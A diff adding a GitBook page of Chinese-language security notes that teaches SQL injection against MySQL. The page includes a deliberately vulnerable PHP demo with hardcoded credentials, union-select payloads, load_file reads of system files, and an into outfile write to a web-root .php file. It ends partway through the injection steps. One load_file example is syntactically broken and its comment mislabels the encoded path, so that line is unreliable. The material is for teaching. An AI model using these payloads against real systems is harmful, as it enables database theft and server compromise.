@@ -1,0 +1,1532 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>SQL注入漏洞 · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-pro/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-back-to-top-button/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-toggle-chapters/toggle.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-collapsible-chapters/collapsible-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-page-toc-button/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="XSS漏洞.html" />
+    
+    
+    <link rel="prev" href="./" />
+    
+
+    <link href="http://zszcr.github.io/notes/rss" title="Sec0zrc's knowledge base book" rel="alternate" type="application/rss+xml" />
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    简介
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    Web常见漏洞原理及利用
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter active" data-level="1.2.1" data-path="SQL注入漏洞.html">
+            
+                <a href="SQL注入漏洞.html">
+            
+                    
+                    SQL注入漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="XSS漏洞.html">
+            
+                <a href="XSS漏洞.html">
+            
+                    
+                    XSS漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="CSRF漏洞.html">
+            
+                <a href="CSRF漏洞.html">
+            
+                    
+                    CSRF漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="SSRF漏洞.html">
+            
+                <a href="SSRF漏洞.html">
+            
+                    
+                    SSRF漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="命令执行&代码执行漏洞.html">
+            
+                <a href="命令执行&代码执行漏洞.html">
+            
+                    
+                    命令执行&代码执行漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="PHP反序列化漏洞.html">
+            
+                <a href="PHP反序列化漏洞.html">
+            
+                    
+                    PHP反序列化漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7" data-path="文件上传漏洞.html">
+            
+                <a href="文件上传漏洞.html">
+            
+                    
+                    文件上传漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../CTFwriteup/">
+            
+                <a href="../CTFwriteup/">
+            
+                    
+                    CTFwriteup
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../CTFwriteup/sqli-labs-writeup.html">
+            
+                <a href="../CTFwriteup/sqli-labs-writeup.html">
+            
+                    
+                    sqli-labs-writeup
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../CTFwriteup/upload_labs writeup.html">
+            
+                <a href="../CTFwriteup/upload_labs writeup.html">
+            
+                    
+                    upload_labs writeup
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="../工具相关/">
+            
+                <a href="../工具相关/">
+            
+                    
+                    工具相关
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="../工具相关/hackbar破解和踩坑之路.html">
+            
+                <a href="../工具相关/hackbar破解和踩坑之路.html">
+            
+                    
+                    hackbar破解和踩坑之路
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="../工具相关/Ubuntu18安装Go.html">
+            
+                <a href="../工具相关/Ubuntu18安装Go.html">
+            
+                    
+                    Ubuntu18安装使用Go
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="../工具相关/内网穿透.html">
+            
+                <a href="../工具相关/内网穿透.html">
+            
+                    
+                    nps内网穿透
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >SQL注入漏洞</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="sql&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;">SQL&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;</h1>
+<h3 id="&#x6F0F;&#x6D1E;&#x539F;&#x7406;">&#x6F0F;&#x6D1E;&#x539F;&#x7406;</h3>
+<p>&#x670D;&#x52A1;&#x7AEF;&#x5728;&#x4E0E;&#x6570;&#x636E;&#x5E93;&#x8FDB;&#x884C;&#x4EA4;&#x4E92;&#x65F6;&#xFF0C;&#x4F7F;&#x7528;&#x4E86;&#x5B57;&#x7B26;&#x4E32;&#x62FC;&#x63A5;&#x7684;&#x65B9;&#x5F0F;&#x6784;&#x9020;SQL&#x8BED;&#x53E5;&#xFF0C;&#x5E76;&#x4E14;&#x670D;&#x52A1;&#x7AEF;&#x6CA1;&#x6709;&#x5BF9;&#x7528;&#x6237;&#x63D0;&#x4EA4;&#x7684;&#x53C2;&#x6570;&#x8FDB;&#x884C;&#x4E25;&#x683C;&#x7684;&#x8FC7;&#x6EE4;&#xFF0C;&#x5BFC;&#x81F4;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x5C06;SQL&#x8BED;&#x53E5;&#x63D2;&#x5165;&#x5230;&#x53EF;&#x63A7;&#x53C2;&#x6570;&#x4E2D;&#xFF0C;&#x6539;&#x53D8;&#x539F;&#x6709;&#x7684;SQL&#x8BED;&#x4E49;&#x7ED3;&#x6784;&#xFF0C;&#x4ECE;&#x800C;&#x8FBE;&#x5230;&#x653B;&#x51FB;&#x8005;&#x6240;&#x9884;&#x671F;&#x7684;&#x7ED3;&#x679C;&#x3002;</p>
+<p>&#x4F8B;&#x5982;&#xFF1A;</p>
+<p>&#x5F00;&#x53D1;&#x8005;&#x4F7F;&#x7528;&#x4E0B;&#x9762;&#x7684;SQL&#x62FC;&#x63A5;&#x8BED;&#x53E5;&#x6765;&#x5411;&#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;&#x6570;&#x636E;</p>
+<blockquote>
+<p>$sql = &quot;select id, username from user where id = $id&quot;;</p>
+</blockquote>
+<p>&#x5176;&#x4E2D;$id&#x662F;&#x7528;&#x6237;&#x53EF;&#x63A7;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x5982;&#x679C;&#x7528;&#x6237;&#x4F20;&#x5165;<code>1 union select 1,database() limit 1,1</code> ,&#x90A3;&#x4E48;&#x62FC;&#x63A5;&#x540E;&#x7684;SQL&#x8BED;&#x4E49;&#x7ED3;&#x6784;&#x5C31;&#x4F1A;&#x88AB;&#x6539;&#x53D8;&#xFF0C;&#x53D8;&#x6210;&#xFF1A;</p>
+<blockquote>
+<p> select id, username from user where id = 1 union select 1,database() limit 1,1</p>
+</blockquote>
+<p>&#x5F53;&#x811A;&#x672C;&#x5411;&#x6570;&#x636E;&#x5E93;&#x8BF7;&#x6C42;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x5C31;&#x4F1A;&#x6267;&#x884C;&#x8FD9;&#x88AB;&#x6539;&#x53D8;&#x7684;SQL&#x8BED;&#x53E5;&#xFF0C;&#x4ECE;&#x800C;&#x8FBE;&#x5230;&#x653B;&#x51FB;&#x8005;&#x9884;&#x671F;&#x7684;&#x6548;&#x679C;</p>
+<h3 id="&#x6F0F;&#x6D1E;&#x5371;&#x5BB3;">&#x6F0F;&#x6D1E;&#x5371;&#x5BB3;</h3>
+<ul>
+<li>&#x83B7;&#x53D6;&#x6570;&#x636E;&#xFF08;&#x8131;&#x88E4;&#xFF09;</li>
+<li>&#x8BFB;&#x53D6;&#x654F;&#x611F;&#x7CFB;&#x7EDF;&#x6587;&#x4EF6;</li>
+<li>&#x5199;&#x5165;WEBSHELL</li>
+<li>&#x547D;&#x4EE4;&#x6267;&#x884C;</li>
+<li>&#x4FEE;&#x6539;&#x4FE1;&#x606F;</li>
+</ul>
+<p>&#x7B49;&#x7B49;</p>
+<h3 id="&#x6F0F;&#x6D1E;&#x5229;&#x7528;">&#x6F0F;&#x6D1E;&#x5229;&#x7528;</h3>
+<h4 id="mysql&#x7684;&#x76F8;&#x5173;&#x77E5;&#x8BC6;&#x70B9;">MYSQL&#x7684;&#x76F8;&#x5173;&#x77E5;&#x8BC6;&#x70B9;</h4>
+<p>&#x5728;&#x8FDB;&#x884C;&#x5229;&#x7528;&#x524D;&#xFF0C;&#x5148;&#x4E86;&#x89E3;&#x4E0B;MYSQL&#x4E0E;SQL&#x6CE8;&#x5165;&#x76F8;&#x5173;&#x7684;&#x77E5;&#x8BC6;&#x70B9;&#xFF0C;&#x540E;&#x9762;SQL&#x6CE8;&#x5165;&#x5229;&#x7528;&#x90FD;&#x662F;&#x57FA;&#x4E8E;MYSQL&#x7684;&#x3002;</p>
+<p><strong>information_schema&#x5E93;</strong></p>
+<p>MYSQL&#x5728;5.0&#x7248;&#x672C;&#x540E;&#xFF0C;&#x9ED8;&#x8BA4;&#x4F1A;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x5B58;&#x653E;&#x4E00;&#x4E2A;&#x53EB;&quot;information_schema&quot;&#x7684;&#x6570;&#x636E;&#x5E93;&#x3002;&#x8FD9;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x4FDD;&#x5B58;&#x4E86;MYSQL&#x4E2D;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4FE1;&#x606F;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x540D;&#x3001;&#x6570;&#x636E;&#x5E93;&#x7684;&#x8868;&#x540D;&#x3001;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x8868;&#x7684;&#x5217;&#x540D;&#x4EE5;&#x53CA;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#x7B49;&#x3002;</p>
+<p>&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x77E5;&#x9053;&#x7684;&#x8868;&#x6709;&#x4E09;&#x4E2A;: SCHEMATA&#x3001;TABLES&#x548C;COLUMNS</p>
+<p>&#x5176;&#x4E2D;SCHEMATA&#x8868;&#x4E2D;&#x7684;SCHEMA_NAME&#x8BB0;&#x5F55;&#x4E86;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#x7684;&#x540D;&#x5B57;</p>
+<p><img src="../images/image-20200515095749956.png" alt="image-20200515095749956"></p>
+<p>TABLES&#x8868;&#x4E2D;&#x7684;TABLE_SCHEMA&#x548C;TABLE_NAME&#x4E24;&#x4E2A;&#x5B57;&#x6BB5;&#x5206;&#x522B;&#x8BB0;&#x5F55;&#x4E86;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5E93;&#x540D;&#x548C;&#x8868;&#x540D;&#x3002;</p>
+<p><img src="../images/image-20200515100010608.png" alt="image-20200515100010608"></p>
+<p>COLUMNS&#x8868;&#x4E2D;&#x5B58;&#x50A8;&#x8BE5;&#x7528;&#x6237;&#x521B;&#x5EFA;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5E93;&#x540D;&#x3001;&#x8868;&#x540D;&#x548C;&#x5B57;&#x6BB5;&#x540D;&#xFF0C;TABLE_SCHEMA&#x8BB0;&#x5F55;&#x4E86;&#x5E93;&#x540D;&#x3001;TABLE_NAME&#x8BB0;&#x5F55;&#x4E86;&#x8868;&#x540D;&#x3001;COLUMN_NAME&#x8BB0;&#x5F55;&#x4E86;&#x5B57;&#x6BB5;&#x540D;&#x3002;</p>
+<p><img src="../images/image-20200515100235014.png" alt="image-20200515100235014"></p>
+<p><strong>MYSQL&#x7684;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;</strong></p>
+<ul>
+<li><p>&#x4E0D;&#x77E5;&#x9053;&#x4EFB;&#x4F55;&#x6761;&#x4EF6;&#x65F6;</p>
+<blockquote>
+<p>select column_name from schema_name.table_name;</p>
+</blockquote>
+<p>&#x5176;&#x4E2D;column_name&#x662F;&#x8981;&#x67E5;&#x8BE2;&#x7684;&#x5B57;&#x6BB5;&#x540D;&#xFF0C;schema_name&#x662F;&#x5E93;&#x540D;&#xFF0C;table_name&#x662F;&#x8868;&#x540D;</p>
+</li>
+<li><p>&#x77E5;&#x9053;&#x4E00;&#x6761;&#x5DF2;&#x77E5;&#x6761;&#x4EF6;&#x65F6;</p>
+<blockquote>
+<p>select column_name from schema_name.table_name  where column_name1=&apos;some_value&apos;;</p>
+</blockquote>
+<p>&#x5176;&#x4E2D;column_name1&#x662F;&#x5DF2;&#x77E5;&#x6761;&#x4EF6;&#x7684;&#x5B57;&#x6BB5;&#x540D;</p>
+</li>
+<li><p>&#x77E5;&#x9053;&#x4E24;&#x6761;&#x5DF2;&#x77E5;&#x6761;&#x4EF6;&#x65F6;</p>
+<blockquote>
+<p>select column_name from schema_name.table_name where  column_name1 = &apos;some_value&apos; and column_name2 = &apos;some_value&apos;;</p>
+</blockquote>
+</li>
+</ul>
+<p><strong>&#x5E38;&#x7528;&#x51FD;&#x6570;</strong></p>
+<ul>
+<li><p>database() &#xFF1A; &#x8FD4;&#x56DE;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x540D;</p>
+</li>
+<li><p>user() &#xFF1A;&#x8FD4;&#x56DE;MYSQL&#x5F53;&#x524D;&#x7528;&#x6237;&#x540D;</p>
+</li>
+<li><p>version() &#xFF1A;&#x8FD4;&#x56DE;MYSQL&#x7684;&#x7248;&#x672C;</p>
+</li>
+<li><p>concat() &#xFF1A;&#x8054;&#x5408;&#x6570;&#x636E;&#xFF0C;&#x7528;&#x4E8E;&#x8054;&#x5408;&#x4E24;&#x6761;&#x6570;&#x636E;&#x7ED3;&#x679C;&#x3002;<code>concat(userid,0x3a,username)</code></p>
+</li>
+<li><p>group_concat() &#xFF1A;&#x548C;concat()&#x7C7B;&#x4F3C;&#xFF0C;&#x7528;&#x4E8E;&#x5C06;&#x591A;&#x6761;&#x6570;&#x636E;&#x4E00;&#x6B21;&#x6CE8;&#x5165;&#x51FA;&#x6765;</p>
+</li>
+<li><p>hex()&#x548C;unhex() &#xFF1A;&#x7528;&#x4E8E;hex&#x7F16;&#x7801;&#x548C;&#x89E3;&#x7801;</p>
+</li>
+<li><p>load_file() &#xFF1A;&#x4EE5;&#x6587;&#x672C;&#x65B9;&#x5F0F;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;</p>
+</li>
+</ul>
+<p><strong>&#x6CE8;&#x91CA;</strong></p>
+<p>&#x884C;&#x95F4;&#x6CE8;&#x91CA;&#xFF1A;--+ &#x548C; #</p>
+<blockquote>
+<p>select * from user; --+</p>
+<p>or</p>
+<p>select * from user;#</p>
+</blockquote>
+<p>&#x884C;&#x5185;&#x6CE8;&#x91CA;&#xFF1A;<code>/*&#x6CE8;&#x91CA;&#x5185;&#x5BB9;*/</code>&#x548C; <code>/*! MYSQL&#x4E13;&#x5C5E;*/</code></p>
+<p>&#x5176;&#x4E2D;MYSQL&#x4E13;&#x5C5E;&#x7684;&#x5185;&#x8054;&#x6CE8;&#x91CA;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x6574;&#x4E2A;SQL&#x8BED;&#x53E5;&#x4E2D;&#xFF0C;&#x5176;&#x4E2D;&#x7684;SQL&#x4EE3;&#x7801;&#x4E5F;&#x4F1A;&#x88AB;&#x6267;&#x884C;&#x3002;</p>
+<blockquote>
+<p>select table_schema,table_name,column_name from columns /<em>! union </em>/ select 1,2,3;</p>
+</blockquote>
+<p><strong>limit</strong></p>
+<p>limit&#x4F1A;&#x8FD4;&#x56DE;&#x524D;&#x9762;&#x51E0;&#x6761;&#x6216;&#x8005;&#x4E2D;&#x95F4;&#x51E0;&#x6761;&#x6570;&#x636E;</p>
+<blockquote>
+<p>select * from user limit m,n</p>
+</blockquote>
+<p> &#x5176;m&#x6307;&#x8BB0;&#x5F55;&#x4ECE;0&#x5F00;&#x59CB;&#x7684;&#x7B2C;m+1&#x6761;&#x8BB0;&#x5F55;&#xFF0C; n&#x6307;&#x4ECE;&#x7B2C;m+1&#x6761;&#x5F00;&#x59CB;&#x53D6;n&#x6761;&#x8BB0;&#x5F55;</p>
+<p><strong>&#x6587;&#x4EF6;&#x5BFC;&#x5165;&#x5BFC;&#x51FA;&#x7684;&#x76F8;&#x5173;&#x64CD;&#x4F5C;</strong></p>
+<p>mysql&#x5E38;&#x7528;&#x7684;&#x5199;&#x5165;&#x5199;&#x51FA;&#x6587;&#x4EF6;&#x7684;&#x51FD;&#x6570;&#x6709;&#xFF1A;</p>
+<ul>
+<li>into dumpfile()</li>
+<li>into outfile()</li>
+<li>load_file()</li>
+</ul>
+<p>&#x8BFB;&#x5199;&#x6587;&#x4EF6;&#x51FD;&#x6570;&#x7684;&#x9650;&#x5236;&#xFF1A;
+&#x6D89;&#x53CA;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x5199;&#x5165;&#x6216;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#xFF0C;&#x4E0A;&#x9762;&#x7684;&#x51FD;&#x6570;&#x80FD;&#x5426;&#x6267;&#x884C;&#x6210;&#x529F;&#x53D7;&#x5230;secure_file_priv&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x7684;&#x5F71;&#x54CD;</p>
+<p>secure_file_priv&#x53C2;&#x6570;&#x7684;&#x610F;&#x4E49;&#xFF1A;</p>
+<pre><code>secure_file_priv=null &#x4E0D;&#x5141;&#x8BB8;&#x6587;&#x4EF6;&#x7684;&#x5BFC;&#x5165;&#x5BFC;&#x51FA; 
+
+secure_file_priv=xxx &#x53EA;&#x5141;&#x8BB8;&#x5728;&#x8FD9;&#x4E2A;&#x76EE;&#x5F55;&#x4E2D;&#x6267;&#x884C;&#x6587;&#x4EF6;&#x7684;&#x5BFC;&#x5165;&#x548C;&#x5BFC;&#x51FA;&#x64CD;&#x4F5C;&#xFF0C;&#x8FD9;&#x4E2A;&#x76EE;&#x5F55;&#x5FC5;&#x987B;&#x5B58;&#x5728;&#xFF0C;MYSQL&#x4E0D;&#x4F1A;&#x521B;&#x5EFA;&#x5B83;
+
+secure_file_priv=/  &#x53EF;&#x4EE5;&#x5BFC;&#x5165;&#x5BFC;&#x51FA;&#x6587;&#x4EF6;&#x5230;&#x4EFB;&#x610F;&#x4F4D;&#x7F6E;
+</code></pre><p>&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>select @@secure_file_priv</code>&#x8BED;&#x53E5;&#x67E5;&#x8BE2;&#xFF0C;&#x800C;&#x4E14;&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x4E0D;&#x80FD;&#x52A8;&#x6001;&#x66F4;&#x6539;&#xFF0C;&#x53EA;&#x80FD;&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x66F4;&#x6539;&#xFF0C;&#x7136;&#x540E;&#x91CD;&#x542F;&#x751F;&#x6548;</p>
+<p><img src="../images/image-20210617153725778.png" alt="image-20210617153725778"></p>
+<p>&#x901A;&#x8FC7;load_file()&#x51FD;&#x6570;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#xFF1A;</p>
+<p>demo&#xFF1A;</p>
+<blockquote>
+<p>select load_file(&quot;c:\boot.ini&quot;)</p>
+<p>select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92, 114,101,112,97,105,114,92,115,97,109)))</p>
+<h1 id="char9958479811111111646105110105&#x5C31;&#x662F;cbootini&#x7684;ascii&#x7801;">char(99,58,47,98,111,111,116,46,105,110,105)&#x5C31;&#x662F;c:/boot.ini&#x7684;ascii&#x7801;</h1>
+</blockquote>
+<p>load_file()&#x51FD;&#x6570;&#x4F1A;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x5E76;&#x8FD4;&#x56DE;&#x8BE5;&#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;</p>
+<p>&#x4F7F;&#x7528;&#x6761;&#x4EF6;&#xFF1A;</p>
+<ul>
+<li>&#x5FC5;&#x987B;&#x6709;&#x6743;&#x9650;&#x8FDB;&#x884C;&#x8BFB;&#x5199;&#x5E76;&#x4E14;&#x6587;&#x4EF6;&#x5FC5;&#x987B;&#x5B8C;&#x5168;&#x53EF;&#x8BFB;</li>
+<li>&#x5FC5;&#x987B;&#x6307;&#x5B9A;&#x6587;&#x4EF6;&#x7684;&#x5B8C;&#x6574;&#x8DEF;&#x5F84;</li>
+<li>&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x7684;&#x5927;&#x5C0F;&#x5FC5;&#x987B;&#x5C0F;&#x4E8E;max_allowed_packet</li>
+</ul>
+<p>&#x5BFC;&#x51FA;&#x6570;&#x636E;&#xFF1A;</p>
+<p>&#x8FD9;&#x91CC;&#x6709;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x5BFC;&#x51FA;&#x6570;&#x636E;&#xFF0C;into outfile()&#x548C; into dumpfile()</p>
+<blockquote>
+<p>select .. into outfile</p>
+<p>select .. int dumpfile</p>
+</blockquote>
+<p>&#x5176;&#x4E2D;outfile&#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x5BFC;&#x51FA;&#x591A;&#x884C;&#xFF0C;&#x800C;dumpfile&#x53EA;&#x80FD;&#x5BFC;&#x51FA;&#x4E00;&#x884C;&#x6570;&#x636E;&#x3002;outfile&#x51FD;&#x6570;&#x5728;&#x5C06;&#x6570;&#x636E;&#x5199;&#x5230;&#x6587;&#x4EF6;&#x91CC;&#x65F6;&#x6709;&#x7279;&#x6B8A;&#x7684;&#x683C;&#x5F0F;&#x8F6C;&#x6362;&#xFF0C;&#x800C;dumpfile&#x5219;&#x4FDD;&#x6301;&#x539F;&#x6570;&#x636E;&#x683C;&#x5F0F;&#x3002;&#x540C;&#x65F6;outfile&#x540E;&#x9762;&#x4E0D;&#x80FD;&#x63A5;0x&#x5F00;&#x5934;&#x6216;&#x8005;char&#x8F6C;&#x6362;&#x4EE5;&#x540E;&#x7684;&#x8DEF;&#x5F84;&#xFF0C;&#x53EA;&#x80FD;&#x662F;&#x5355;&#x5F15;&#x53F7;&#x8DEF;&#x5F84;&#x3002;</p>
+<p>demo&#xFF1A;</p>
+<pre><code># into outfile
+select version() into outfile &quot;c:\\phpstduy_pro\\www\\test.php&quot;
+
+#into dumpfile
+select * from test into dumpfile &apos;/tmp/test.txt&apos;
+</code></pre><h4 id="&#x5E38;&#x89C4;&#x6CE8;&#x5165;&#x6B65;&#x9AA4;">&#x5E38;&#x89C4;&#x6CE8;&#x5165;&#x6B65;&#x9AA4;</h4>
+<p>demo: sql.php</p>
+<pre><code class="lang-php">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=gbk&quot;</span> /&gt;
+    &lt;title&gt;&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;form method=<span class="hljs-string">&quot;GET&quot;</span> action=<span class="hljs-string">&quot;&quot;</span>&gt;
+    ID&#xFF1A;
+    &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;id&quot;</span> /&gt;
+    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;&#x67E5;&#x8BE2;&quot;</span> /&gt;
+&lt;/form&gt;
+<span class="hljs-meta">&lt;?php</span>
+
+$host = <span class="hljs-string">&apos;127.0.0.1:3306&apos;</span>;
+$un = <span class="hljs-string">&apos;root&apos;</span>;
+$pw = <span class="hljs-string">&apos;123456&apos;</span>;
+$db = <span class="hljs-string">&apos;vul&apos;</span>;
+
+$id = @$_GET[<span class="hljs-string">&apos;id&apos;</span>];
+<span class="hljs-keyword">if</span>($id == <span class="hljs-string">&apos;&apos;</span>)
+    <span class="hljs-keyword">return</span>;
+$conn = @mysqli_connect($host, $un, $pw);
+<span class="hljs-keyword">if</span>(!$conn)
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x9519;&#x8BEF;&#xFF1A;&apos;</span> . mysqli_error($conn));
+mysqli_select_db($conn, $db);
+$sql = <span class="hljs-string">&quot;select id, username from users where id=$id&quot;</span>;
+$res = mysqli_query($conn, $sql);
+<span class="hljs-keyword">if</span>(!$res)
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;&#x6570;&#x636E;&#x5E93;&#x9519;&#x8BEF;&#xFF1A;&apos;</span>. mysqli_error($conn));
+$num = mysqli_num_rows($res);
+<span class="hljs-keyword">if</span>($num == <span class="hljs-number">0</span>)
+{ 
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;ID&#xFF1A;$id&lt;/p&gt;&quot;</span>;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;&#x65E0;&#x6B64;&#x8BB0;&#x5F55;&lt;/p&gt;&quot;</span>;
+}
+<span class="hljs-keyword">else</span>
+{
+    $row = mysqli_fetch_row($res);
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;ID&#xFF1A;$id&lt;/p&gt;&quot;</span>;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Username&#xFF1A;${row[1]}&lt;/p&gt;&quot;</span>;
+}
+mysqli_close($conn);
+<span class="hljs-meta">?&gt;</span>
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>&#x8FD9;&#x91CC;&#x4EE5;&#x8FD9;&#x4E2A;demo&#x4E3A;&#x4F8B;&#x5B50;&#xFF0C;&#x6765;&#x8FC7;&#x4E00;&#x904D;&#x5E38;&#x89C4;&#x6CE8;&#x5165;&#x6B65;&#x9AA4;</p>
+<p><strong>&#x5E38;&#x89C4;&#x6CE8;&#x5165;&#x6B65;&#x9AA4;&#xFF1A;</strong></p>
+<ol>
+<li><p>&#x7206;&#x5B57;&#x6BB5;&#x6570;</p>
+<p>&#x8FD9;&#x91CC;&#x5229;&#x7528;order by&#x6765;&#x5224;&#x65AD;&#x5B57;&#x6BB5;&#x6570;</p>
+<blockquote>
+<p>id = 1 order by ?</p>
+</blockquote>
+<p>&#x8FD9;&#x91CC;&#x901A;&#x8FC7;&#x66FF;&#x6362;&#x95EE;&#x53F7;&#x4E3A;&#x4ECE;1&#x5F00;&#x59CB;&#x7684;&#x6570;&#x5B57;&#xFF0C;&#x4E00;&#x4E2A;&#x4E2A;&#x53BB;&#x6D4B;&#x8BD5;&#xFF0C;&#x76F4;&#x5230;&#x67D0;&#x4E2A;&#x6570;&#x5B57;n&#x62A5;&#x9519;&#xFF0C;&#x90A3;&#x4E48;&#x5217;&#x6570;&#x5C31;&#x4E3A;n-1</p>
+<p><img src="../images/image-20200515104259727.png" alt="image-20200515104259727"></p>
